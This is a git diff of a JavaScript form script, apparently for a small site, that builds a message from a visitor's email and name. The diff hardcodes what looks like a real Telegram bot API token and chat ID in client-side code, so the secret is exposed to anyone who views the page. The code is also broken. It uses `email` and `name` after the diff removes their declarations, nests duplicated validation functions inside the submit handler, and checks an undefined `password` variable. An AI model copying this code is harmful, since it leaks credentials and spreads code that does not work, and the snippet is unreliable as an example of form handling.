@@ -146,22 +146,72 @@ function checkEmailLenght() {
   document.addEventListener('DOMContentLoaded', checkEmailLenght)
   // #endregion
   async function formSubmit(event) {
-    const email = window.inpEmail.value;
-    const name = window.inpName.value;
-
+    let apiToken = "6685344433:AAFe9Yea_lcKqx1dzqTdsWtfcIJus5QMg2U";
+    let chatId = "-4066219312";
+ 
     event.preventDefault();
 
  
     if(!email || !name) {
         return false;
     }
-
-    let apiToken = "6685344433:AAFe9Yea_lcKqx1dzqTdsWtfcIJus5QMg2U";
-    let chatId = "-4066219312";
+ 
 
     let text = `
     Email: ${email}    
     Name: ${name}
     `;
+    const EMAIL_MIN_LENGHT = 5;
+const mediumRegex = new RegExp("^(((?=.*[a-z])(?=.*[A-Z]))|((?=.*[a-z])(?=.*[0-9]))|((?=.*[A-Z])(?=.*[0-9])))(?=.{8,})");
+
+function testNameRegex(value) {
+    return mediumRegex.test(value);
+}
+
+function checkEmailLenght() {
+    const valueLenght = window.inputEmail.value.length;
+    const diff = valueLenght < EMAIL_MIN_LENGHT ? EMAIL_MIN_LENGHT - valueLenght : 0;
+
+    if(diff) {
+        window.emailDiffCount.textContent = diff;
+        window.emailLenghtHelp.classList.remove('d-none');
+    } else {
+        window.emailLenghtHelp.classList.add('d-none');
+    }
+};
+
+function resetValidation() {
+    window.emailHelp.classList.add('d-none');
+    window.nameHelp.classList.add('d-none');
+    window.nameHelpDescription.classList.add('d-none');
+}
+
+function validateForm(event) {
+    event.preventDefault();
+    resetValidation();
+    
+    const email = window.inputEmail.value;
+    const name = window.inputName.value;
+
+    if(!email) {
+        window.emailHelp.classList.remove('d-none');
+        return false;
+    }
+    if(!password) {
+        window.nameHelp.classList.remove('d-none');
+        return false;
+    }
+
+    if(!testNameRegex(password)) {
+        window.nameHelp.classList.remove('d-none');
+        window.nameHelpDescription.classList.remove('d-none');
+    }
+ 
+};
+
+
+// window.inputEmail.addEventListener('input', checkEmailLenght);
+window.form.addEventListener('submit', formSubmit);
+// document.addEventListener('DOMContentLoaded', checkEmailLenght);
  
   }
